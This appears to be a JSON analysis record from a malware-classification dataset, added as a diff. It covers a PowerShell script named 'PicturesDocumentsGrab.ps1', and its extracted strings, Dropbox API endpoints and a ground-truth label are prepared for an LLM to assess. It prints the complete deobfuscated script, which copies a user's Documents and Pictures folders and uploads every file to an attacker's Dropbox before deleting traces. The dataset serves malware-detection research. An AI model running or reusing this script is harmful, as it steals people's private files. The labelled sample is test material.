@@ -1,0 +1,133 @@
+{
+  "meta": {
+    "quelldatei": "tech_021_PicturesDocumentsGrab.ps1",
+    "sha256": "46e9b519a18843fec86edb10f035515b8746735f8d9c64510229963391019f79",
+    "groesse_bytes": 1581,
+    "zeilen": 34,
+    "ground_truth_label": "techniques",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [
+      "CaliLoot",
+      "Authorization",
+      "Bearer $DropBoxAccessToken",
+      "Content-Type",
+      "application/json",
+      "{ \"path\": \"/CaliLoot\", \"autorename\": false }",
+      "MyDocuments",
+      "MyPictures",
+      "\n        $folderName = $_ -replace ",
+      "\n        $targetPath = \"/CaliLoot/$folderName\"\n        Copy-Item $sourcePath $TempFolderPath -Recurse -ErrorAction SilentlyContinue\n        Get-ChildItem $TempFolderPath -File -Recurse | ForEach-Object {\n            $filePath = $_.FullName\n            $targetFilePath = \"$targetPath/$($_.Directory.Name)/$($_.Name)\"\n            $arg = ",
+      "path",
+      "' + $targetFilePath + '",
+      "mode",
+      "add",
+      "autorename",
+      "mute",
+      "\n            $headers = @{ \"Authorization\" = \"Bearer $DropBoxAccessToken\"; \"Dropbox-API-Arg\" = $arg; \"Content-Type\" = ",
+      "YOUR DROPBOX TOKEN HERE"
+    ],
+    "string_anzahl_gesamt": 18,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0
+  },
+  "stufe2_features": {
+    "strings": [
+      "CaliLoot",
+      "Authorization",
+      "Bearer $DropBoxAccessToken",
+      "Content-Type",
+      "application/json",
+      "{ \"path\": \"/CaliLoot\", \"autorename\": false }",
+      "MyDocuments",
+      "MyPictures",
+      "\n        $folderName = $_ -replace ",
+      "\n        $targetPath = \"/CaliLoot/$folderName\"\n        Copy-Item $sourcePath $TempFolderPath -Recurse -ErrorAction SilentlyContinue\n        Get-ChildItem $TempFolderPath -File -Recurse | ForEach-Object {\n            $filePath = $_.FullName\n            $targetFilePath = \"$targetPath/$($_.Directory.Name)/$($_.Name)\"\n            $arg = ",
+      "path",
+      "' + $targetFilePath + '",
+      "mode",
+      "add",
+      "autorename",
+      "mute",
+      "\n            $headers = @{ \"Authorization\" = \"Bearer $DropBoxAccessToken\"; \"Dropbox-API-Arg\" = $arg; \"Content-Type\" = ",
+      "YOUR DROPBOX TOKEN HERE"
+    ],
+    "string_anzahl_gesamt": 18,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Content-Type",
+      "Copy-Item",
+      "Dropbox-API",
+      "Get-ChildItem",
+      "Get-PicDoc",
+      "Invoke-RestMethod",
+      "Join-Path",
+      "Out-Null",
+      "Remove-Item"
+    ],
+    "auffaellige_tokens": {},
+    "iocs": {
+      "urls": [
+        "https://api.dropboxapi.com/2/files/create_folder_v2",
+        "https://content.dropboxapi.com/2/files/upload"
+      ],
+      "ipv4": [],
+      "pfade": [
+        "$env:TEMP"
+      ]
+    }
+  },
+  "stufe3_structure": {
+    "strings": [
+      "CaliLoot",
+      "Authorization",
+      "Bearer $DropBoxAccessToken",
+      "Content-Type",
+      "application/json",
+      "{ \"path\": \"/CaliLoot\", \"autorename\": false }",
+      "MyDocuments",
+      "MyPictures",
+      "\n        $folderName = $_ -replace ",
+      "\n        $targetPath = \"/CaliLoot/$folderName\"\n        Copy-Item $sourcePath $TempFolderPath -Recurse -ErrorAction SilentlyContinue\n        Get-ChildItem $TempFolderPath -File -Recurse | ForEach-Object {\n            $filePath = $_.FullName\n            $targetFilePath = \"$targetPath/$($_.Directory.Name)/$($_.Name)\"\n            $arg = ",
+      "path",
+      "' + $targetFilePath + '",
+      "mode",
+      "add",
+      "autorename",
+      "mute",
+      "\n            $headers = @{ \"Authorization\" = \"Bearer $DropBoxAccessToken\"; \"Dropbox-API-Arg\" = $arg; \"Content-Type\" = ",
+      "YOUR DROPBOX TOKEN HERE"
+    ],
+    "string_anzahl_gesamt": 18,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Content-Type",
+      "Copy-Item",
+      "Dropbox-API",
+      "Get-ChildItem",
+      "Get-PicDoc",
+      "Invoke-RestMethod",
+      "Join-Path",
+      "Out-Null",
+      "Remove-Item"
+    ],
+    "auffaellige_tokens": {},
+    "iocs": {
+      "urls": [
+        "https://api.dropboxapi.com/2/files/create_folder_v2",
+        "https://content.dropboxapi.com/2/files/upload"
+      ],
+      "ipv4": [],
+      "pfade": [
+        "$env:TEMP"
+      ]
+    },
+    "deobfuskiert_auszug": "function Get-PicDoc {\n    param (\n        [Parameter(Mandatory = $true)]\n        [string]$DropBoxAccessToken\n    )\n\n    $TempFolderPath = Join-Path $env:TEMP 'CaliLoot'\n\n    $headers = @{ \"Authorization\" = \"Bearer $DropBoxAccessToken\"; \"Content-Type\" = 'application/json' }\n    Invoke-RestMethod -Uri https://api.dropboxapi.com/2/files/create_folder_v2 -Method Post -Headers $headers -Body '{ \"path\": \"/CaliLoot\", \"autorename\": false }' | Out-Null\n\n    # Copy folders and upload files to Dropbox\n    $copyFolders = @('MyDocuments', 'MyPictures')\n    $copyFolders | ForEach-Object {\n        $sourcePath = Join-Path ([Environment]::GetFolderPath($_)) '*'\n        $folderName = $_ -replace 'My', ''\n        $targetPath = \"/CaliLoot/$folderName\"\n        Copy-Item $sourcePath $TempFolderPath -Recurse -ErrorAction SilentlyContinue\n        Get-ChildItem $TempFolderPath -File -Recurse | ForEach-Object {\n            $filePath = $_.FullName\n            $targetFilePath = \"$targetPath/$($_.Directory.Name)/$($_.Name)\"\n            $arg = '{ \"path\": \"' + $targetFilePath + '\", \"mode\": \"add\", \"autorename\": true, \"mute\": false }'\n            $headers = @{ \"Authorization\" = \"Bearer $DropBoxAccessToken\"; \"Dropbox-API-Arg\" = $arg; \"Content-Type\" = 'application/octet-stream' }\n            Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $filePath -Headers $headers | Out-Null\n        }\n    }\n\n    Remove-Item $TempFolderPath -Recurse -Force\n}\n\n# Example usage:\n#$DropBoxToken = \"YOUR DROPBOX TOKEN HERE\"\n#Get-PicDoc -DropBoxAccessToken $DropBoxToken\n",
+    "dekodierte_befehle": [],
+    "beobachtete_abfolge": []
+  }
+}
